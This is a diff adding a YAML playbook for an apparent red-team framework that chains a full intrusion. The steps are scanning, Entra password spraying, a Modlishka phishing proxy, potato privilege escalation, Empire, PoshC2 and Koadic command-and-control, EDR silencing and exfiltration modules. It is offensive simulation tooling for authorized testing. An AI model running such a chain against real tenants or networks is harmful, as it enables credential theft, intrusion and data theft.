@@ -1,0 +1,112 @@
+name: "Advanced Persistent Threat Simulation"
+description: "Full-spectrum APT simulation combining reconnaissance, exploitation, C2, and exfiltration"
+author: "Escanor Team"
+created: "2024-01-24"
+version: "2.0.0"
+
+phases:
+  phase1_reconnaissance:
+    description: "Initial reconnaissance and target profiling"
+    steps:
+      - module: "reconnaissance/port_scan"
+        options:
+          PORTS: "1-65535"
+          PROTOCOL: "tcp"
+        enabled: true
+      
+      - module: "reconnaissance/web_scan"
+        options:
+          CHECK_HEADERS: "True"
+          CHECK_SSL: "True"
+        enabled: true
+      
+      - module: "reconnaissance/vuln_scan"
+        options: {}
+        enabled: true
+
+  phase2_initial_access:
+    description: "Initial access attempts"
+    steps:
+      - module: "cloud/entra/msolspray"
+        options:
+          TENANT_ID: "{{TENANT_ID}}"
+          USERLIST: "/path/to/users.txt"
+        enabled: true
+      
+      - module: "cloud/entra/modlishka"
+        options:
+          PHISHING_DOMAIN: "{{PHISHING_DOMAIN}}"
+          TARGET_URL: "https://login.microsoftonline.com"
+        enabled: true
+
+  phase3_execution_privesc:
+    description: "Code execution and privilege escalation"
+    steps:
+      - module: "exploitation/privesc/godpotato"
+        options:
+          cmd: "whoami"
+        enabled: true
+      
+      - module: "exploitation/privesc/sigmapotato"
+        options:
+          cmd: "whoami /priv"
+        enabled: true
+      
+      - module: "exploitation/privesc/printspoofer"
+        options:
+          cmd: "cmd.exe"
+        enabled: true
+
+  phase4_persistence:
+    description: "Establish persistence mechanisms"
+    steps:
+      - module: "persistence/*"
+        enabled: true
+
+  phase5_c2_establishment:
+    description: "Establish command and control"
+    steps:
+      - module: "c2_frameworks/empire_c2"
+        options:
+          LISTENER_NAME: "http_listener"
+          HOST: "{{C2_HOST}}"
+        enabled: true
+      
+      - module: "c2_frameworks/poshc2"
+        options:
+          IMPLANT_TYPE: "powershell"
+        enabled: true
+      
+      - module: "c2_frameworks/koadic"
+        options:
+          STAGER: "js/mshta"
+        enabled: true
+
+  phase6_lateral_movement:
+    description: "Lateral movement across the network"
+    steps:
+      - module: "lateral_movement/*"
+        enabled: true
+
+  phase7_evasion:
+    description: "EDR/AV evasion techniques"
+    steps:
+      - module: "evasion/edrsilencer"
+        options:
+          METHOD: "suspend"
+        enabled: true
+
+  phase8_exfiltration:
+    description: "Data exfiltration simulation"
+    steps:
+      - module: "exfiltration/*"
+        enabled: true
+
+  phase9_ai_analysis:
+    description: "AI-powered post-assessment analysis"
+    steps:
+      - module: "ai_assisted/ai_analyze"
+        options:
+          OBJECTIVE: "full"
+          CONTEXT: "APT simulation complete - provide remediation recommendations"
+        enabled: true
